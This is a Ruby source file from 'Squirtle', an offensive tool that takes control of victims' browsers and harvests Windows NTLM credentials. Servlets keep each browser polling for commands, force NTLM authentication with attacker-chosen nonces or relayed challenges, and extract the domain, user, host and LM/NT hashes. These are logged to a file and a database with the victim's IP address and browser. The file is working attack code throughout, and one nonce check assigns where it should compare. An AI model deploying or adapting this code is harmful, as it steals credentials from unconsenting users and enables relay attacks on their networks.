# Squirtle Victim Controller Code
#
# Copyright (C) 2008  Kurt Grutzmacher
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.


# keepalive between browser and squirtle
class KeepAliveServlet < HTTPServlet::AbstractServlet
	
	def do_GET(req, resp)
		resp.keep_alive = false
		resp.status = 200
		resp['Content-Type'] = "application/jsonrequest"
		peeraddr = req.peeraddr[3]
		
		key = getsessionkey(req)
		resp['Set-Cookie'] = "key=#{key}; path=/; Max-Age=10080"

		# search for a session or create a new one if it doesn't exist
		sess = Session.find(:first, :conditions => [ "key_id = ?", key ])
		if sess == nil then
			puts "[*] Creating new session: #{key}\n"
			sess = Session.new
			sess.key_id = key
		end
			
		sess.timestamp = Time.now.to_f
		
		# Check the client key to see if "func" is defined with correct variables
		# and return a JSON structure accordingly.
		# "func" can be one of:
		#   'static' => request client auth with static "nonce"
		#   'type2'  => request client auth to "type2" message
		#   'redir'  => force client to redirect to "url" and give up control
		# if nothing, return timeout value
		case sess.function 
			when "redir"
				resp.body = "{ 'status': 'ok', 'refresh': 'true', 'url': '#{sess.url}', 'keepalive': #{$config['timeout']} }"
			when "static"
				resp.body = "{ 'status': 'ok', 'auth': 'true', 'url': '#{sess.url}', 'keepalive': #{$config['timeout']} }"
			when "type2"
				resp.body = "{ 'status': 'ok', 'auth': 'true', 'url': '#{sess.url}', 'keepalive': #{$config['timeout']} }"
			else
				resp.body = "{ 'status': 'ok', 'keepalive': #{$config['timeout']} }"
		end

		sess.save
		
	end
	alias do_POST do_GET
	
end

# Collect lm/nt hashes with preconfigured nonce.
# If "Authorization" is found in the HTTP Headers then the type of message is
# enumerated and processed.
class AuthorizationServlet < HTTPServlet::AbstractServlet
	def do_GET(req, resp)

		key = getsessionkey(req)
		
		if !req['Authorization'] then
			# no authorization header, force NTLM auth
			resp['WWW-Authenticate'] = "NTLM"
			resp['Content-Type'] = "text/html"
			resp.keep_alive = false
			raise HTTPStatus::Unauthorized
		else
			
			# search for a session or create a new one if it doesn't exist
			sess = Session.find(:first, :conditions => [ "key_id = ?", key ])
			if sess == nil then
				puts "[*] Creating new session: #{key}\n"
				sess = Session.new
				sess.key_id = key				
			end
				
			sess.timestamp = Time.now.to_f
			
			ntlmauth = req['Authorization'].split(" ").last
			decode = Rex::Text.decode_base64(ntlmauth.strip)
			type = decode[8]																	
			if type == 1 then
				
				# check to see if there's a session request with a type2 message waiting
				case sess.function
					when "type2"
						if sess.type2_base64.length > 0 then
							type2msg = sess.type2_base64
							puts "[*] Attacker supplied Type2 Base64 used: #{type2msg}"
						else
							type2msg = Rex::Proto::SMB::Utils.process_type1_message(ntlmauth, sess.nonce, sess.domain, sess.server, sess.dns_name, sess.dns_domain)
							puts "[*] Attacker supplied data Type2 returned: #{type2msg}"
						end
					when "static"
						if sess.nonce.length = 16 then
							nonce = sess.nonce.to_a.pack('h*')
						else
							puts "[!] Attacker-supplied nonce not 16 characters: #{sess.nonce}, using preconfigured nonce"
							nonce = $config['nonce']
						end
					else
						# all else fails, use the preconfigured nonce
						nonce = $config['nonce']
				end
									
				if sess.function != "type2" then
					type2msg = Rex::Proto::SMB::Utils.process_type1_message(ntlmauth, nonce, $config['domain'], $config['server'], $config['dns_name'], $config['dns_domain'])
				end
				
				puts "[*] Type 1 message received"
				resp['WWW-Authenticate'] = "NTLM #{type2msg}"
				resp.keep_alive = true													# keep connection alive from the client
				resp.status = 401
			elsif type == 3 then															# Type 3 messages are parsed here
				puts "[*] Type 3 message received"
				(domain, user, host, lm, nt) = Rex::Proto::SMB::Utils.process_type3_message(ntlmauth)
				host = host.gsub(/\x00/, '')		# remove nulls (not unicode happy here)
				user = user.gsub(/\x00/, '')		# remove nulls (not unicode happy here either)
				domain = domain.gsub(/\x00/, '')		# ditto!
				puts "[!] Authorization info: #{host}/#{user}:#{domain}:#{lm}:#{nt}"
				
				if sess.function == "type2" or sess.function == "static" then
					nonce = sess.nonce
				else
					nonce = $config['nonce'].unpack('h*')
				end
				
				fd = File.open($config['output-file'], "a")
				fd.puts("#{host}/#{user}:#{domain}:#{nonce}:#{lm}:#{nt}")
				fd.close
				peeraddr = req.peeraddr[3]

				# add user entry to the database
				User.new do |u|
					u.key = key
					u.timestamp = Time.now.to_f
					u.ip = peeraddr
					u.browser = req['User-Agent']
					u.user = user
					u.workstation = host
					u.domain = domain
					u.nonce = nonce.to_s
					u.lm = lm.to_s
					u.nt = nt.to_s
					u.save
				end

				# if a type2 request is pending, update with the type3 base64 result 
				if sess.function == "type2"
					sess.result = ntlmauth
				end

				sess.function = ""
				sess.save
				
				resp.keep_alive = false
				resp.status = 200
				resp.body = "{ 'status': 'ok' }"
				resp['Content-Type'] = "application/jsonrequest"
			else
				puts "[!] Message type #{type} received - not a 1 or 3, ignoring"
				resp.keep_alive = false
				resp.status = 200
				resp.body = "{ 'status': 'ok' }"
				resp['Content-Type'] = "application/jsonrequest"
			end
		end
		resp['Set-Cookie'] = "key=#{key}, path=/; Max-Age=10080" 
	end
	alias do_POST do_GET
	
end